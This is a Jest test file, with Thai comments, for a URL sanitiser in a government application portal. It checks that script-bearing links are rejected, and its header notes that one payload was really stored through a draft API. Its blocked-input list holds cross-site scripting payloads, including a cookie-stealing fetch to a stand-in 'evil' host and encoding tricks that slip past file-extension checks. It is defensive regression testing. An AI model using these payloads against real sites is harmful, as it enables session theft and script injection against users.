/**
 * ตรึงสิ่งที่ safe-url ต้องกัน และสิ่งที่ต้องไม่พัง
 *
 * ค่าตัวแรกในรายการอันตรายคือค่าที่เก็บลงฐานข้อมูลได้จริงเมื่อ 2026-09-09 ผ่าน
 * POST /api/applications/draft ด้วยโทเคนของผู้ยื่นเอง แล้วอ่านกลับได้จาก
 * GET /api/provider/applications/:id ในฝั่งเจ้าหน้าที่
 */

import { safeUrl, safeSrc } from '../safe-url';

const TAB = String.fromCharCode(9);
const NEWLINE = String.fromCharCode(10);
const NUL = String.fromCharCode(0);

describe('สิ่งที่กลายเป็นโค้ดได้ ต้องไม่กลายเป็น href', () => {
  const DANGEROUS = [
    'javascript:alert(document.domain)',
    "javascript:fetch('//evil/'+document.cookie)",
    'JavaScript:alert(1)',
    '  javascript:alert(1)',
    `java${TAB}script:alert(1)`,
    `java${NEWLINE}script:alert(1)`,
    `java${NUL}script:alert(1)`,
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    // การตรวจนามสกุลไฟล์กันไม่ได้ — สองอันนี้ผ่านทั้ง isPdfFileUrl และ isImageFileUrl
    'javascript:alert(1)//x.pdf',
    'javascript:alert(1)//x.png',
  ];

  it.each(DANGEROUS)('%s -> null', (value) => {
    expect(safeUrl(value)).toBeNull();
    expect(safeSrc(value)).toBeUndefined();
  });
});

describe('ที่อยู่จริงยังใช้ได้ ไม่มีการเข้าถึงที่หายไป', () => {
  const SAFE = [
    '/uploads/application-drafts/1788908107272-doc.pdf',
    '/uploads/car/finding-response.pdf',
    'https://www.dtam.moph.go.th/',
    'http://127.0.0.1:8100/api/health',
    'mailto:contact@example.go.th',
    'uploads/relative/path.png',
  ];

  it.each(SAFE)('%s ผ่านโดยไม่ถูกดัดแปลง', (value) => {
    expect(safeUrl(value)).toBe(value);
  });
});

describe('ขอบที่พลาดง่าย', () => {
  it('//evil.example resolve เป็น https จึงผ่าน แต่ไม่ได้ผ่านด้วยกฎ "ขึ้นต้นด้วย /"', () => {
    expect(safeUrl('//evil.example/x')).toBe('//evil.example/x');
  });

  it('ค่าที่ไม่ใช่สตริงหรือว่างเปล่า -> null', () => {
    for (const v of [null, undefined, 0, {}, [], '', '   ']) {
      expect(safeUrl(v)).toBeNull();
    }
  });

  it('ไม่ตัดแต่งค่าที่ผ่าน — สิ่งที่คืนคือสิ่งที่ผู้ใช้ให้มา', () => {
    const url = 'https://example.com/a?b=1&c=%E0%B8%81';
    expect(safeUrl(url)).toBe(url);
  });
});
